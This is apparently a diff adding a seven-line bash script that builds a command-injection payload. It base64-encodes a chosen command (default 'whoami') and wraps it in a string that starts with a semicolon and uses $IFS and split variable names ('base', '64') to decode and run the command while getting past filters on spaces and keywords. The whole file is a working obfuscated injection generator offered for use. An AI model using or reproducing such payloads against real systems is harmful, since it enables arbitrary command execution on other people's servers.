@@ -1,0 +1,7 @@
+#!/bin/bash
+
+INPUT="${1:-whoami}"
+a=$(base64 <<< "$INPUT")
+PAYLOAD=";a=('$a');b=('base');c=\$IFS;d=64;\$(\$b\$d\$c-d\$c-<\$c<(echo\$c\$a))"
+echo -e "Payload:\n$PAYLOAD"
+
